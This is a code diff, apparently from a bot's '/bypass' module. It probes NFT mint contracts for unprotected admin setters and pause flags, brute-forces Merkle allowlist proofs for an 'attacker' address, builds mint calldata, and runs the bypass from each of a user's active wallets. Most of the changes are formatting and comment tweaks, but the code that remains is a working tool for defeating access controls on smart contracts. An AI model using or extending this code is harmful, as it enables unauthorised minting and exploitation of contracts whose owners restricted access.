@@ -70,13 +70,10 @@ export interface BypassOutcome {
   results: BypassWalletResult[];
 }
 
-// ---------------------------------------------------------------------------
-// viem 2.21 strict-generics helpers — dynamic ABIs need a light cast to compile
-// ---------------------------------------------------------------------------
+// viem 2.21 dynamic-ABI helpers — avoid functionName: never / args: never
 function encodeCall(abi: Abi, functionName: string, args: readonly unknown[]): Hex {
-  return encodeFunctionData(
-    { abi, functionName, args } as never
-  ) as Hex;
+  // eslint-disable-next-line @typescript-eslint/no-explicit-any
+  return encodeFunctionData({ abi, functionName, args } as any) as Hex;
 }
 
 async function readCall<T>(
@@ -87,12 +84,13 @@ async function readCall<T>(
   try {
     const abi = [parseAbiItem(signature)] as Abi;
     const name = signature.replace(/^function\s+/, "").split("(")[0];
+    // eslint-disable-next-line @typescript-eslint/no-explicit-any
     const result = (await client.readContract({
       address,
       abi,
       functionName: name,
       args: [],
-    } as never)) as T;
+    } as any)) as T;
     return result;
   } catch {
     return null;
@@ -139,10 +137,17 @@ const MINT_CANDIDATES: Array<{ name: string; args: string[] }> = [
 function defaultArg(type: string, attacker: Address): unknown {
   const t = type.trim().toLowerCase();
   if (t === "address") return attacker;
-  if (t === "uint256" || t === "uint128" || t === "uint64" || t === "uint32" || t === "uint16" || t === "uint8") {
+  if (
+    t === "uint256" ||
+    t === "uint128" ||
+    t === "uint64" ||
+    t === "uint32" ||
+    t === "uint16" ||
+    t === "uint8"
+  ) {
     return 1n;
   }
-  if (t === "bool") return false; // unpause / open-sale style setters expect false
+  if (t === "bool") return false;
   if (t === "bytes32") return ("0x" + "00".repeat(32)) as Hex;
   if (t === "bytes") return "0x" as Hex;
   if (t === "bytes32[]") return [] as Hex[];
@@ -158,11 +163,12 @@ function buildArgs(argTypes: string[] | undefined, attacker: Address): readonly 
 }
 
 function fullSignature(name: string, argTypes: string[]): string {
-  return argTypes.length === 0 ? `function ${name}()` : `function ${name}(${argTypes.join(",")})`;
+  return argTypes.length === 0
+    ? `function ${name}()`
+    : `function ${name}(${argTypes.join(",")})`;
 }
 
 function leafHash(addr: Address): Hex {
-  // OpenZeppelin StandardMerkleTree single-address leaf: keccak256(keccak256(abi.encode(addr)))
   const inner = keccak256(encodeAbiParameters([{ type: "address" }], [addr]));
   return keccak256(encodePacked(["bytes32"], [inner]));
 }
@@ -172,10 +178,6 @@ function hashPair(a: Hex, b: Hex): Hex {
   return keccak256(encodePacked(["bytes32", "bytes32"], [left, right]));
 }
 
-/**
- * Rebuild a Merkle proof for `attacker` against an on-chain root by brute-forcing
- * common single-leaf / small-tree layouts. Pure viem — no merkletreejs dependency.
- */
 export function tryRebuildMerkleProof(
   root: Hex,
   attacker: Address,
@@ -193,7 +195,6 @@ export function tryRebuildMerkleProof(
   );
 
   const leaves = candidates.map((a) => leafHash(a));
-  // Try every 2-leaf pairing that includes attacker
   for (let i = 0; i < leaves.length; i++) {
     for (let j = 0; j < leaves.length; j++) {
       if (i === j) continue;
@@ -204,7 +205,6 @@ export function tryRebuildMerkleProof(
       if (leaves[j].toLowerCase() === attackerLeaf.toLowerCase()) return [leaves[i]];
     }
   }
-
   return null;
 }
 
@@ -266,7 +266,9 @@ export async function classifyMintGate(
     const v = await readMaybeHex(client, address, sig);
     if (v && v !== ("0x" + "00".repeat(32))) {
       merkleRootValue = v;
-      notes.push(`Merkle root readable via ${sig.split("(")[0].replace(/^function\s+/, "")}`);
+      notes.push(
+        `Merkle root readable via ${sig.split("(")[0].replace(/^function\s+/, "")}`
+      );
       break;
     }
   }
@@ -289,21 +291,27 @@ export async function classifyMintGate(
         });
       }
     } catch {
-      // probe failed — not a problem
+      // probe failed
     }
   }
 
   let gateType: GateType = "unknown";
-  if (openAdminSetters.some((s) => /unpause|setPaused|setPause|pause/i.test(s.name)) && paused) {
+  if (
+    openAdminSetters.some((s) => /unpause|setPaused|setPause|pause/i.test(s.name)) &&
+    paused
+  ) {
     gateType = "paused";
   } else if (merkleRootValue) {
     gateType = "merkle";
-  } else if (openAdminSetters.some((s) => /public|sale|mintEnabled|whitelistOnly|onlyWhitelist/i.test(s.name))) {
+  } else if (
+    openAdminSetters.some((s) =>
+      /public|sale|mintEnabled|whitelistOnly|onlyWhitelist/i.test(s.name)
+    )
+  ) {
     gateType = "balance_or_phase";
   } else if (openAdminSetters.length > 0) {
     gateType = "mapping";
   } else {
-    // Try a no-arg mint eth_call to see if already open
     try {
       const abi = parseAbi(["function mint()"]);
       const data = encodeCall(abi, "mint", []);
@@ -343,7 +351,7 @@ async function buildMintCalldata(
         return { data, name: cand.name, signature: sig };
       }
     } catch {
-      // try next
+      // next
     }
   }
   return null;
@@ -408,11 +416,19 @@ export async function analyzeBypassOptions(
     if (root) {
       const proof = tryRebuildMerkleProof(root, attacker);
       if (proof) {
-        const merkleMints: Array<{ name: string; types: string[]; build: (p: Hex[]) => readonly unknown[] }> = [
+        const merkleMints: Array<{
+          name: string;
+          types: string[];
+          build: (p: Hex[]) => readonly unknown[];
+        }> = [
           { name: "mint", types: ["bytes32[]"], build: (p) => [p] },
           { name: "mint", types: ["uint256", "bytes32[]"], build: (p) => [1n, p] },
           { name: "whitelistMint", types: ["bytes32[]"], build: (p) => [p] },
-          { name: "whitelistMint", types: ["uint256", "bytes32[]"], build: (p) => [1n, p] },
+          {
+            name: "whitelistMint",
+            types: ["uint256", "bytes32[]"],
+            build: (p) => [1n, p],
+          },
           { name: "claim", types: ["bytes32[]"], build: (p) => [p] },
         ];
 
@@ -484,7 +500,9 @@ export async function analyzeBypassOptions(
   }
 
   if (strategies.every((s) => !s.executable)) {
-    fingerprint.notes.push("No on-chain bypass found — contract appears properly gated or not a free mint");
+    fingerprint.notes.push(
+      "No on-chain bypass found — contract appears properly gated or not a free mint"
+    );
   }
 
   return { contractAddress: address, fingerprint, strategies };
@@ -515,7 +533,9 @@ export async function executeBypass(
   const security = await auditContractSecurity(address);
   if (!security.isSafe) {
     throw new Error(
-      `Security check blocked execution: ${security.warnings.join("; ") || "contract flagged unsafe"}`
+      `Security check blocked execution: ${
+        security.warnings.join("; ") || "contract flagged unsafe"
+      }`
     );
   }
 
@@ -524,7 +544,9 @@ export async function executeBypass(
   const wallets = await getWallets(userId);
   const active = wallets.filter((w) => w.isActive);
   if (active.length === 0) {
-    throw new Error("No active wallets. Toggle at least one wallet to ✅ before executing a bypass.");
+    throw new Error(
+      "No active wallets. Toggle at least one wallet to ✅ before executing a bypass."
+    );
   }
 
   const probeFrom = getAddress(active[0].address) as Address;
@@ -532,7 +554,9 @@ export async function executeBypass(
   const strategy = report.strategies.find((s) => s.id === strategyId);
 
   if (!strategy) {
-    throw new Error(`Unknown strategyId "${strategyId}". Run /bypass first and pick an id from the list.`);
+    throw new Error(
+      `Unknown strategyId "${strategyId}". Run /bypass first and pick an id from the list.`
+    );
   }
   if (!strategy.executable || !strategy.calldata || !strategy.to) {
     throw new Error(
@@ -556,7 +580,15 @@ export async function executeBypass(
           success: false,
           error: `Simulation reverted: ${sim.error || "unknown"}`,
         });
-        await logBypass(userId, address, strategyId, walletAddress, false, undefined, sim.error);
+        await logBypass(
+          userId,
+          address,
+          strategyId,
+          walletAddress,
+          false,
+          undefined,
+          sim.error
+        );
         continue;
       }
 
@@ -587,7 +619,15 @@ export async function executeBypass(
         success: false,
         error: message,
       });
-      await logBypass(userId, address, strategyId, walletAddress, false, undefined, message);
+      await logBypass(
+        userId,
+        address,
+        strategyId,
+        walletAddress,
+        false,
+        undefined,
+        message
+      );
     }
   }
 
@@ -616,7 +656,6 @@ async function logBypass(
       },
     });
   } catch (err) {
-    // Never fail the mint path because of audit-log issues
     console.error("BypassLog write failed:", err);
   }
 }
